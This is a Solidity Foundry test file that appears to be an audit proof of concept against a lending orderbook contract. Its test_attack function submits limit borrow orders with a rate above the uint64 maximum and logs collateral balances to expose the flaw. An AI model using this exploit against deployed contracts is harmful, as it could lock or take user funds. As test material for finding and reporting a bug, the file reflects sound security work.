// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import {Test} from "../lib/forge-std/src/Test.sol";
import {TreeState, PreviewBorrowParams} from "../src/interface/Types.sol";
import {Orderbook} from "../src/Orderbook.sol";
import {OrderbookFactory} from "../src/OrderbookFactory.sol";
import {MockPoolFactory} from "./mocks/MockPoolFactory.sol";
import {MockERC20} from "./mocks/MockERC20.sol";
import {MockPool} from "./mocks/MockPool.sol";
import {MockIRM} from "./mocks/MockIRM.sol";
import {IOrderbook} from "../src/interface/IOrderbook.sol";
import {BorrowerLimitOrder} from "../src/interface/Types.sol";
import {AugmentedRedBlackTreeLib} from "../src/libraries/AugmentedRedBlackTreeLib.sol";
import "forge-std/console.sol";

contract InsertLimitBorrowOrder is Test {
    OrderbookFactory factory;
    Orderbook orderbook;
    MockERC20 loanToken;
    MockERC20 collateralToken;
    MockPoolFactory poolFactory;
    MockPool pool;
    MockIRM irm;

    address admin = makeAddr("admin");
    address poolManager = makeAddr("poolManager");
    address poolManager2 = makeAddr("poolManager2");
    address feeRecipient = makeAddr("feeRecipient");
    address borrower = makeAddr("borrower");
    address lender = makeAddr("lender");
    address keeper = makeAddr("keeper");

    function setUp() public {
        vm.startPrank(admin);

        // Deploy tokens
        loanToken = new MockERC20("Loan Token", "LOAN");
        collateralToken = new MockERC20("Collateral Token", "COLL");

        // Deploy factory
        factory = new OrderbookFactory(admin);

        // Deploy and enable IRM
        irm = new MockIRM(0.01e18, 0.1e18, 1e18, 0.8e18);
        factory.setIrm(address(irm), true);

        // Deploy pool factory
        poolFactory = new MockPoolFactory();

        // Create orderbook
        factory.setPoolManager(poolManager, true);
        factory.setPoolFactory(address(poolFactory), true);
        factory.setKeeper(keeper, true);
        address orderbookAddress =
            factory.createOrderbook(address(loanToken), address(collateralToken), address(feeRecipient));
        orderbook = Orderbook(orderbookAddress);

        pool = poolFactory.createPool(address(loanToken), address(orderbook), address(irm), address(collateralToken));

        vm.stopPrank();

        // Setup accounts with tokens
        loanToken.mint(lender, 10000e18);
        collateralToken.mint(borrower, 10000e18);
        collateralToken.mint(orderbookAddress, 10000e18);

        // Whitelist pool
        vm.prank(poolManager);
        orderbook.whitelistPool(address(pool), address(poolFactory));
        vm.stopPrank();
    }
        function test_attack() public {
        // -------------- step 1 ---------------
        // Setup: initial deposits
        uint256 depositeAmount = 1000e18;

        // Lender approves + deposits to `pool` (this becomes the older pool)
        vm.startPrank(lender);
        loanToken.approve(address(pool), depositeAmount);
        pool.deposit(depositeAmount, lender);

        // Sanity checks: ensure pool have order
        uint256[] memory poolOrderIds = orderbook.getPoolOrders(address(pool));
        assertGt(poolOrderIds.length, 0);

        // Fast-forward 2 days so pool2's insertion is later (pool2 = newer)
        vm.warp(block.timestamp + 2 days);

        // --------------- step 2 ---------------

        vm.startPrank(borrower);


        // -------------------------
        // Borrow parameters
        // -------------------------
        uint256 borrowAmount = 90e18;
        uint256 minAmountExpected = borrowAmount - (borrowAmount / 10); // 10% slippage
        uint256 collateralBuffer = 0.05e18;
        uint256 UINT64_MAX = type(uint64).max;
        uint256 rate = UINT64_MAX + 1e18; // 100% rate
        uint64 ltv = 0.5e18; // 50% ltv

        // Preview to get collateral required for the borrower (keeps test realistic)
        (,, uint256 collateralRequired,) = orderbook.previewBorrow(
            PreviewBorrowParams({
                borrower: borrower,
                amount: borrowAmount,
                collateralBuffer: collateralBuffer,
                rate: 1e18, // matching rate of both pools
                ltv: 0.5e18, // matching ltv of both pools
                isMarketOrder: true,
                isCollateral: false
            })
        );

        // borrower approves collateral (preparation for match)
        
        collateralToken.approve(address(orderbook), collateralRequired);
        orderbook.insertLimitBorrowOrder(rate, ltv, borrowAmount, minAmountExpected, collateralBuffer, collateralRequired);
        console.log("order length 2:", orderbook.getBorrowerOrders(borrower).length);
        console.log("order amount:", orderbook.getBorrowerOrders(borrower)[0].amount / 1e18);
        console.log("borrower collateral balance:", collateralToken.balanceOf(borrower) / 1e18);
        vm.stopPrank();

        console.log("orderbook collateral balance:", collateralToken.balanceOf(address(orderbook)) / 1e18);
        assertGt(collateralToken.balanceOf(address(orderbook)), 10000e18, "Expected collateral to be deposited in orderbook");
        vm.warp(block.timestamp + 2 days);
        // --------------- step 3 --------------
        
        vm.startPrank(borrower);
        borrowAmount = 100e18;
        minAmountExpected = 45e18;

        // Preview to get collateral required for the borrower (keeps test realistic)
        (,, uint256 collateralRequired3,) = orderbook.previewBorrow(
            PreviewBorrowParams({
                borrower: borrower,
                amount: borrowAmount,
                collateralBuffer: collateralBuffer,
                rate: 1e18, // matching rate of both pools
                ltv: 0.5e18, // matching ltv of both pools
                isMarketOrder: true,
                isCollateral: false
            })
        );

        collateralToken.approve(address(orderbook), collateralRequired3);
        orderbook.insertLimitBorrowOrder(rate, ltv, borrowAmount, minAmountExpected, collateralBuffer, collateralRequired3);
        vm.stopPrank();
        vm.warp(block.timestamp + 2 days);
        console.log("orderbook collateral balance:", collateralToken.balanceOf(address(orderbook)) / 1e18);
        console.log("borrower collateral balance:", collateralToken.balanceOf(borrower) / 1e18);
        console.log("order amount after :", orderbook.getBorrowerOrders(borrower)[0].amount / 1e18);
        console.log("collateral required 1:", collateralRequired / 1e18);
        console.log("collateral required 2:", collateralRequired3 / 1e18);

        
    }

}